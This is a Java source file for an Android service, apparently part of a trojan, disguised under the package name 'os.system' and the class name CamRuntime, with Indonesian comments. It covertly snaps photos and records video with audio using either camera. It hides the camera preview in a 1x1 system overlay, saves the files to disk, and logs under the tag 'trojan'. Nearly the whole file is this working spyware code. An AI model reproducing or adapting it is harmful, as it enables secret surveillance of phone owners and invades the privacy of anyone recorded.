package os.system;

import android.app.*;
import android.content.*;
import android.view.*;
import android.os.*;
import android.graphics.*;
import android.widget.*;
import android.hardware.Camera;
import android.util.*;
import java.io.*;
import java.text.*;
import android.media.*;
import java.util.*;

public class CamRuntime extends Service {

    private LocalBinder localBinder = new LocalBinder();
    private DummyPreview dummyPreview;
    public static int isCamera = 1;//depan
    public static String path = "";
    public static int kualitas = 0;

    public DummyPreview getDummyPreview() {
        return dummyPreview;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
		if (kualitas == 1) {
            kualitas = CamcorderProfile.QUALITY_480P;
        } else {
            kualitas = CamcorderProfile.QUALITY_LOW;
        }
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        this.dummyPreview = new DummyPreview(this, startId);
        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(1, 1,
																	   WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
																	   WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH, PixelFormat.TRANSLUCENT);
        lp.gravity = Gravity.START | Gravity.TOP;
        wm.addView(dummyPreview, lp);
        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        wm.removeViewImmediate(dummyPreview);
        stopSelf();

    }

    public static void capturePhoto(Context context, String kamera) {

        Camera camera = null;
        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();

        int frontCamera = 1;
        if (kamera.equals("back")) {
            frontCamera = 0;
            Log.i("trojan", "cam:"+frontCamera);
        } 

        Camera.getCameraInfo(frontCamera, cameraInfo);

        try {
            camera = Camera.open(frontCamera);
        } catch (RuntimeException e) {
            camera = null;
            Log.i("trojan", "kamera:"+kamera+" err ff:"+e);

            e.printStackTrace();
        }
        try {
            if (null == camera) {
            } else {
                try {
                    camera.setPreviewTexture(new SurfaceTexture(0));
                    camera.startPreview();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                camera.takePicture(null, null, new Camera.PictureCallback() 
                {
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera) {
                        File pictureFileDir = new File(path);
                        if (!pictureFileDir.exists() && !pictureFileDir.mkdirs()) {
                            pictureFileDir.mkdirs();
                        }
                        String photoFile = "/foto.jpg";
                        String filename = pictureFileDir.getPath() + File.separator + photoFile;
                        File mainPicture = new File(filename);

                        try {
                            FileOutputStream fos = new FileOutputStream(mainPicture);
                            fos.write(data);
                            fos.close();
                        } catch (Exception error) {
                            Log.i("trojan", "err save:"+error);
                        }
                        camera.release();
                    }
                });
            }
        } catch (Exception e) {
            camera.release();
            Log.i("trojan", "err camera:"+e);

        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return localBinder;
    }

    public class LocalBinder extends Binder {

        public void matikan() {
            stopSelf();
        }

        public boolean isAktif() {
            return (dummyPreview != null) && dummyPreview.isAktif();
        }

    }

}

class DummyPreview extends SurfaceView implements SurfaceHolder.Callback {

    private Camera camera;
    private CamRuntime videoRecordService;
    private RecordThread recorderThread;
    private int serviceId;

    public DummyPreview(CamRuntime videoRecordService, int serviceId) {
        super(videoRecordService);
        this.videoRecordService = videoRecordService;
        this.serviceId = serviceId;
        getHolder().addCallback(this);
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            camera = Camera.open(new CamRuntime().isCamera);
            camera.setPreviewDisplay(holder);
            recorderThread = new RecordThread(serviceId, videoRecordService, camera);
            recorderThread.start();
        } catch (Exception e) {
            Log.e("MyRecorder", "Terjadi kesalahan saat menampilkan preview...", e);
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        if (recorderThread != null) {
            recorderThread.setAktif(false);
            Log.i("trojan", "surface destroy");
        }
    }

    public boolean isAktif() {
        return (recorderThread == null)? false: recorderThread.isAktif();
    }

}

class RecordThread extends Thread {

    private boolean aktif;
    private int serviceId;
    private final CamRuntime recorderService;
    private Camera camera;
    private String outputFile = "";

    public RecordThread(int serviceId, CamRuntime recorderService, Camera camera) {
        this.serviceId = serviceId;
        this.aktif = true;
        this.recorderService = recorderService;
        this.camera = camera;
        outputFile = new CamRuntime().path + "/REC_SYSTEM.mp4";
    }

    @Override
    public void run() {
        Log.i("trojan", "save: "+outputFile);
        try {
            // Memulai proses rekaman
            MediaRecorder mediaRecorder = new MediaRecorder();
            camera.unlock();
            mediaRecorder.setCamera(camera);
            mediaRecorder.setOrientationHint(270);
            mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            mediaRecorder.setProfile(CamcorderProfile.get(new CamRuntime().kualitas));
            mediaRecorder.setOutputFile(outputFile);
            mediaRecorder.setPreviewDisplay(recorderService.getDummyPreview().getHolder().getSurface());
            mediaRecorder.prepare();
            mediaRecorder.start();
            aktif = true;
            while (aktif) {
                Thread.sleep(100);
            }
            mediaRecorder.stop();
            mediaRecorder.reset();
            mediaRecorder.release();

        } catch (Exception ex) {
            Log.e("MyRecorder", "Terjadi kesalahan saat merekam", ex);
        } finally {
            camera.release();
            recorderService.stopSelf(serviceId);
        }
    }

    public boolean isAktif() {
        return aktif;
    }

    public void setAktif(boolean aktif) {
        this.aktif = aktif;
    }

}


